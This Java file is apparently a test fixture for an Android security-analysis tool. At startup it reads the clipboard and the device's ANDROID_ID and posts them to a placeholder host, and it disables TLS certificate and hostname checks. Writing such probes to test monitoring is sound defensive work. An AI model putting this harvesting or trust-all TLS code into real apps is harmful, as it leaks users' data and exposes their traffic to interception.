package com.vetro.probe;

import android.app.Activity;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;

import java.io.OutputStream;
import java.net.URL;
import java.security.cert.X509Certificate;

import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

/**
 * Test app for Vetro's analyses from the outside (M7 TLS, M8 Binder).
 * At startup, in a thread: reads the clipboard and ANDROID_ID (sensitive
 * Binder transactions) and makes an HTTPS POST with a JSON body (plaintext
 * from the TLS hooks). See README.md.
 */
public class MainActivity extends Activity {
    static final String TAG = "vetro-probe";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        String host = getIntent() != null && getIntent().getStringExtra("host") != null
                ? getIntent().getStringExtra("host") : "api.esempio.test";
        new Thread(() -> run(host)).start();
    }

    void run(String host) {
        // M8: clipboard (IClipboard.getPrimaryClip via Binder).
        String clip = "";
        try {
            ClipboardManager cb = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData d = cb.getPrimaryClip();
            if (d != null && d.getItemCount() > 0) {
                clip = String.valueOf(d.getItemAt(0).getText());
            }
        } catch (Throwable t) {
            Log.w(TAG, "appunti", t);
        }
        // M8: ANDROID_ID (IContentProvider.call to Settings via Binder).
        String androidId = "";
        try {
            androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        } catch (Throwable t) {
            Log.w(TAG, "android_id", t);
        }
        Log.i(TAG, "appunti=" + clip + " android_id=" + androidId);

        // M7: HTTPS POST with a JSON body (plaintext from the TLS hooks).
        String body = "{\"android_id\":\"" + androidId + "\",\"clip\":\"" + clip + "\",\"ts\":1}";
        try {
            trustOurCa();
            URL url = new URL("https://" + host + "/v1/eventi");
            HttpsURLConnection c = (HttpsURLConnection) url.openConnection();
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "application/json");
            c.setRequestProperty("X-Vetro-Probe", "1");
            c.setDoOutput(true);
            try (OutputStream os = c.getOutputStream()) {
                os.write(body.getBytes("UTF-8"));
            }
            int code = c.getResponseCode();
            Log.i(TAG, "https " + code);
        } catch (Throwable t) {
            Log.w(TAG, "https", t);
        }
    }

    /**
     * For the test only: accepts every certificate, so the connection
     * completes against the sinkhole's TLS endpoint (the plaintext comes from
     * the hooks, not from the records). In production it would use Vetro's
     * development CA in the trust store.
     */
    void trustOurCa() throws Exception {
        TrustManager[] tm = { new X509TrustManager() {
            public void checkClientTrusted(X509Certificate[] c, String a) {}
            public void checkServerTrusted(X509Certificate[] c, String a) {}
            public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
        } };
        SSLContext sc = SSLContext.getInstance("TLS");
        sc.init(null, tm, new java.security.SecureRandom());
        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
        HttpsURLConnection.setDefaultHostnameVerifier((h, s) -> true);
    }
}
